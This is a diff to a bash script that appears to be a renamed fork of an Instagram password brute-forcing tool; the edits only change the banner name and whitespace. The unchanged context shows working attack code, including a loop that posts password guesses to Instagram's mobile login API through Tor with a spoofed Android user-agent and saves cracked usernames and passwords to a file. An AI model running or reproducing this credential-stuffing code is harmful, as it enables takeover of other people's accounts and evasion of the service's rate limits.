@@ -32,7 +32,7 @@ banner() {
 
 printf "\e[1;95m                             ______           \e[0m\n"
 printf "\e[1;95m                          .-        -.         \e[0m\n"
-printf "\e[1;95m                         / SKAR-HACK  \         \e[0m\n"
+printf "\e[1;95m                         / TRHACKNON  \         \e[0m\n"
 printf "\e[1;95m                           ---------             \e[0m\n"
 printf "\e[1;95m                        |,  .-.  .-.  ,|         \e[0m\n" 
 printf "\e[1;77m                        | )(_ /  \_ )( |             \e[0m\n"
@@ -140,7 +140,7 @@ else
 printf "\e[1;92mOK!\e[0m\n"
 let checkcount++
 fi
- 
+
 printf "\e[1;92m[*] Checking Tor connection on port:\e[0m\e[1;77m 9053\e[0m..."
 check3=$(curl --socks5-hostname localhost:9053 -s https://www.google.com > /dev/null; echo $?)
 if [[ "check3" -gt 0 ]]; then
@@ -238,7 +238,7 @@ let counter++
 printf "\e[1;77mTrying pass (%s/%s)\e[0m: \"%s\"\n" $countpass $count_pass $pass
 
 {(trap '' SIGINT && var=$(curl --socks5-hostname 127.0.0.1:9051 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq ); if [[ $var == "challenge" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge required\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instainsane ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"; rm -rf nottested.lst; kill -1 $$ > /dev/null 2>&1  ; elif [[ $var == "logged_in_user" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instainsane ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"; rm -rf nottested.lst; kill -1 $$  > /dev/null 2>&1 ; elif [[ $var == "Please wait" ]]; then echo $pass >> nottested.lst ; elif [[ $var == "" ]]; then echo $pass >> nottested.lst ; fi; ) } & done; pid1=$! ; #;wait $!;
- 
+
 let startline+=20
 let endline+=20
 
